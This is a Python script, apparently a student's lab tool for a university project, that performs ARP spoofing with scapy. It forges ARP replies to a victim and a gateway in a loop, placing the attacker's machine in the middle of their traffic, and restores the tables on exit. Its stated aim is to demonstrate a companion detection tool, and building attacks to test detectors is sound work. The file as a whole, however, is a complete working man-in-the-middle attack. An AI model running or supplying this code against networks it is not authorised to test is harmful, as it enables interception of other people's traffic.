# =============================================================================
#  arp_attack.py  –  ARP Spoofing Attack Simulator (Lab / Demo Use Only)
#  Project : ARP Spoofing Detection Tool  |  PUSL3190
#  Author  : Angam Wijebandara  |  Plymouth ID: 10954873
#
#  PURPOSE:
#    This script generates REAL ARP spoofing packets on a local network.
#    Use ONLY in a controlled lab environment on a network you own.
#    This script is used to DEMONSTRATE that the detection tool works.
#
#  HOW IT WORKS:
#    1. Sends fake ARP replies to the VICTIM saying the GATEWAY's MAC is ours.
#    2. Sends fake ARP replies to the GATEWAY saying the VICTIM's MAC is ours.
#    3. This poisons both ARP tables → all traffic flows through the attacker.
#    4. The detection tool on the victim machine will detect this immediately.
#
#  REQUIREMENTS:
#    pip install scapy
#    Run as Administrator (Windows) or sudo (Linux/macOS)
#
#  USAGE:
#    python arp_attack.py
#    Then enter the IPs when prompted.
#
#  TO STOP:
#    Press Ctrl+C — the script will automatically restore the real ARP tables.
# =============================================================================

from scapy.all import ARP, Ether, sendp, srp, get_if_hwaddr, conf
import time
import sys


# =============================================================================
# CONFIGURATION — Edit these or enter when prompted
# =============================================================================

# Leave as None to enter interactively, or set here:
VICTIM_IP    = None     # e.g. "192.168.1.10"   — machine running your detector
GATEWAY_IP   = None     # e.g. "192.168.1.1"    — your router IP
INTERFACE    = None     # e.g. "Wi-Fi" or "eth0" — leave None for auto-detect
INTERVAL_SEC = 2        # How often to send fake ARP packets (seconds)


# =============================================================================
# HELPER: Get the real MAC address of an IP on the network
# =============================================================================

def get_mac(ip, iface):
    """Send an ARP request and return the real MAC address of the given IP."""
    pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
    answered, _ = srp(pkt, iface=iface, timeout=3, verbose=False)
    if answered:
        return answered[0][1].hwsrc
    return None


# =============================================================================
# CORE: Send a single fake ARP reply
# =============================================================================

def spoof(target_ip, target_mac, spoof_ip, iface):
    """
    Send a fake ARP reply to target_ip, telling it that spoof_ip's MAC
    is OUR MAC (the attacker's MAC).

    target_ip  : who we're lying to
    target_mac : the MAC address of the target device
    spoof_ip   : whose IP we're pretending to own
    """
    # Build fake ARP reply — op=2 means "ARP Reply"
    pkt = Ether(dst=target_mac) / ARP(
        op=2,                   # ARP Reply
        pdst=target_ip,         # send to target
        hwdst=target_mac,       # target's MAC
        psrc=spoof_ip,          # pretend to be this IP
        # hwsrc defaults to our own MAC automatically
    )
    sendp(pkt, iface=iface, verbose=False)


# =============================================================================
# RESTORE: Send correct ARP replies to fix poisoned tables on exit
# =============================================================================

def restore(target_ip, target_mac, real_ip, real_mac, iface):
    """Send the REAL ARP mapping to undo the poisoning (called on Ctrl+C)."""
    pkt = Ether(dst=target_mac) / ARP(
        op=2,
        pdst=target_ip,
        hwdst=target_mac,
        psrc=real_ip,
        hwsrc=real_mac,
    )
    # Send multiple times to make sure it lands
    sendp(pkt, iface=iface, count=5, verbose=False)


# =============================================================================
# MAIN
# =============================================================================

def main():
    global VICTIM_IP, GATEWAY_IP, INTERFACE

    print("=" * 60)
    print("  ARP SPOOFING ATTACK TOOL — Lab Demo Only")
    print("  PUSL3190 | Angam Wijebandara | 10954873")
    print("=" * 60)
    print()

    # ── Get interface ─────────────────────────────────────────
    if INTERFACE is None:
        try:
            INTERFACE = str(conf.iface)
        except Exception:
            INTERFACE = input("Enter network interface name: ").strip()
    print(f"[*] Interface : {INTERFACE}")

    # ── Get IPs ───────────────────────────────────────────────
    if VICTIM_IP is None:
        VICTIM_IP = input("[?] Enter VICTIM IP   (machine running detector): ").strip()
    if GATEWAY_IP is None:
        GATEWAY_IP = input("[?] Enter GATEWAY IP  (your router IP): ").strip()

    print()
    print(f"[*] Victim IP  : {VICTIM_IP}")
    print(f"[*] Gateway IP : {GATEWAY_IP}")
    print()

    # ── Resolve real MAC addresses ────────────────────────────
    print("[*] Resolving MAC addresses...")

    victim_mac = get_mac(VICTIM_IP, INTERFACE)
    if not victim_mac:
        print(f"[!] ERROR: Cannot find MAC for victim {VICTIM_IP}")
        print("    Make sure both machines are on the same network.")
        sys.exit(1)

    gateway_mac = get_mac(GATEWAY_IP, INTERFACE)
    if not gateway_mac:
        print(f"[!] ERROR: Cannot find MAC for gateway {GATEWAY_IP}")
        sys.exit(1)

    print(f"[+] Victim  MAC  : {victim_mac}")
    print(f"[+] Gateway MAC  : {gateway_mac}")
    print()
    print("[!] Starting ARP poisoning attack...")
    print("    Press Ctrl+C to stop and restore ARP tables.")
    print()

    packet_count = 0

    try:
        while True:
            # Poison victim: tell victim that Gateway's MAC = our MAC
            spoof(
                target_ip=VICTIM_IP,
                target_mac=victim_mac,
                spoof_ip=GATEWAY_IP,
                iface=INTERFACE,
            )

            # Poison gateway: tell router that Victim's MAC = our MAC
            spoof(
                target_ip=GATEWAY_IP,
                target_mac=gateway_mac,
                spoof_ip=VICTIM_IP,
                iface=INTERFACE,
            )

            packet_count += 2
            print(f"\r[+] Sent {packet_count} spoofed packets...", end="", flush=True)

            time.sleep(INTERVAL_SEC)

    except KeyboardInterrupt:
        print()
        print()
        print("[*] Ctrl+C detected — Stopping attack...")
        print("[*] Restoring real ARP tables...")

        # Restore victim's ARP table
        restore(
            target_ip=VICTIM_IP,
            target_mac=victim_mac,
            real_ip=GATEWAY_IP,
            real_mac=gateway_mac,
            iface=INTERFACE,
        )

        # Restore gateway's ARP table
        restore(
            target_ip=GATEWAY_IP,
            target_mac=gateway_mac,
            real_ip=VICTIM_IP,
            real_mac=victim_mac,
            iface=INTERFACE,
        )

        print("[+] ARP tables restored. Attack stopped cleanly.")
        print(f"[+] Total spoofed packets sent: {packet_count}")
        print()


if __name__ == "__main__":
    main()
